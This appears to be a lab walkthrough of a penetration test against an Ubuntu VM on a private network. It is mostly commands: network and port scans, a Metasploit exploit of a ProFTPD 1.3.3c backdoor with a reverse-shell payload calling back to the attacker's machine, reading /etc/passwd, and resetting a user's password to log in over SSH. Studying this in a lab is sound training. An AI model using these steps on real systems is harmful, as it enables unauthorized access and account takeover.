
# Penetration Testing a Basic Ubuntu VM

In this walkthrough, I'll demonstrate the steps I took to perform a basic penetration test Lab on an Ubuntu Virtual Machine (VM).
## Objective

The objective of this penetration test is to identify vulnerabilities in an Ubuntu VM and exploit them to gain unauthorized access. 

### Prerequisites

Before starting, ensure you have the following tools installed:

- `netdiscover`
- `nmap`
- `msfconsole`

## Steps

### 1. Network Scanning

First, I scanned the network to identify all connected devices and find any unrecognized IP addresses:

```bash
netdiscover -r 192.168.56.0/24
```

### 2. Port Scanning

After identifying an unrecognized IP address, I scanned for open ports on that machine:

```bash
nmap -A -p- 192.168.56.105
```

### 3. Vulnerability Assessment

Next, I checked for vulnerabilities in the FTP service:

```bash
nmap --script=vuln -p21 192.168.56.105
```

### 4. Exploitation

Identifying a backdoor vulnerability in the FTP service, I used `msfconsole` to exploit it:

```bash
msfconsole
```

### 5. Searching for Exploits

Using `msfconsole`, I searched for an exploit targeting the FTP vulnerability:

```bash
search ftpd_133c
```

### 6. Exploiting the Vulnerability

After identifying the appropriate exploit, I used it to gain root access to the VM:

```bash
use unix/ftp/proftpd_133c_backdoor
```

### 7. Setting Payload and Exploiting

Configuring the payload and exploiting the VM:

```bash
set RHOST 192.168.56.105
set lhost 192.168.56.102
set payload payload/cmd/unix/reverse
exploit
```

### 8. Spawning a TTY Shell

To spawn a TTY shell for better interaction:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### 9. Enumeration

Enumerating users on the system:

```bash
cat /etc/passwd
```

### 10. User Privilege Escalation

Identifying the user "marlinspike," attempting to change its password:

```bash
passwd marlinspike
```

### 11. SSH Connection

Finally, attempting an SSH connection with the identified user:

```bash
ssh marlinspike@192.168.56.105
```

## Conclusion

This walkthrough demonstrates the basic steps involved in performing a penetration test on an Ubuntu VM. It highlights the importance of thorough network scanning, vulnerability assessment, and exploitation to uncover potential security risks.

---

